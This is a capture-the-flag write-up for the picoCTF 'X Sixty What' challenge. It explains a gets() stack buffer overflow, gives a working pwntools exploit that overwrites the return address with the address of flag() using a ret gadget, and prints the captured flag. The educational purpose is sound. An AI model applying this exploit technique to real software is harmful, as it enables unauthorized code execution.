# Writeup: X Sixty What

## Introduction

To capture the flag we will be taking advantage of the buffer overflow vulnerability. In the code the gets function is called in its own function called vuln(). The function that contains the code necessary to print the flag also exists in its own function. The goal then must be to overflow the buffer with enough bytes to get us to the address where the return address is stored on the stack and then overwrite that address with the address of the flag function. 

## Relevant Code

```
    #define BUFFSIZE 64
    #define FLAGSIZE 64
    
    void flag() {
        char buf[FLAGSIZE];
        FILE *f = fopen("flag.txt","r");
        if (f == NULL) {
            printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
            exit(0);
        }

        fgets(buf,FLAGSIZE,f);
        printf(buf);
    }

    void vuln(){
        char buf[BUFFSIZE];
        gets(buf);
    }
    
```

## Locating Relevant Information

As you can see the gets function places no limit on how many characters we can pass into the buffer buf, meaning we can overflow the buffer and overwrite the return address on the stack to be the address of the flag function. Since the size of the buffer is 64 bytes then the offset is at least 64 bytes. In order to figure out the exact space between the buffer and the return address we can open gdb when it the binary is in the vuln function and get information on the stack frame which will show us the address of the buffer buf and the address where the return address is stored on the function's stack.

```
    gef➤  b vuln
    ...
    gef➤  info frame
    Stack level 0, frame at 0x7fffffffda90:
    rip = 0x7ffff7e2c080 in _IO_gets (./libio/iogets.c:32); saved rip = 0x4012cf
    called by frame at 0x7fffffffdae0
    source language c.
    Arglist at 0x7fffffffda80, args: buf=0x7fffffffda90 "\320\332\377\377\377\177"
    Locals at 0x7fffffffda80, Previous frame's sp is 0x7fffffffda90
    Saved registers:
    rip at 0x7fffffffda88
```

## Constructing Payload Plan

From the data provided to us by gdb using the info frame command we can see that the return address is stored at: 

`0x7fffffffda88`

The buffer is located at:

`0x7fffffffda90`

Which means that the buffer is 8 bytes away from the return address (we get this number by subtracting one from the other) and since the buffer is 64 bytes long, we need 64 + 8 bytes to get to the return address. Now that we have the full payload you would think that we have enough to obtain the flag, but that isn't the case. The challenge description warns: 

`Reminder: local exploits may not always work the same way remotely due to differences between machines.`

So while this might work locally (although it also might not work locally), it may not work remotely due to a different environment variables, ways of organizing memory, etc. The aforementioned factors may cause your payload to be misaligned and thus leave the attack ineffective. In order to mitigate this we can add an extra ret function which executes an extra pop rip which advances rsp by 8 bytes ensuring the stack is properly aligned and allowing our payload to be successfully delivered. We can do this by looking for ROP gadgets inside the binary. ROP gadgets are instructions present in the binary that allow us to run code inside the binary without injecting any ourselves. With our plan to construct and deliver the payload complete we can now write the code which I have included below:

```
    from pwn import *
    context.arch = "amd64"
    p = remote('saturn.picoctf.net', 53964)
    address = 0x401236
    elf = ELF('./vuln')
    rop = ROP(elf)
    ret = p64(rop.find_gadget(['ret'])[0])
    offset = b'A' * (64 + 8)
    p.recvuntil(b':')
    payload = offset + ret + p64(address, endian='little')
    p.sendline(payload)
    p.interactive()
```
## Results

Finally, we can send the payload. Below are the results:

```
    [+] Opening connection to saturn.picoctf.net on port 53964: Done
    [*] '/mnt/c/Users/18506/Desktop/CTF/X-Sixty-What/vuln'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
        [*] Loaded 14 cached gadgets for './vuln'
        [*] Switching to interactive mode

    picoCTF{b1663r_15_b3773r_47a99eda}[*] Got EOF while reading in interactive
```
With that we have the flag.
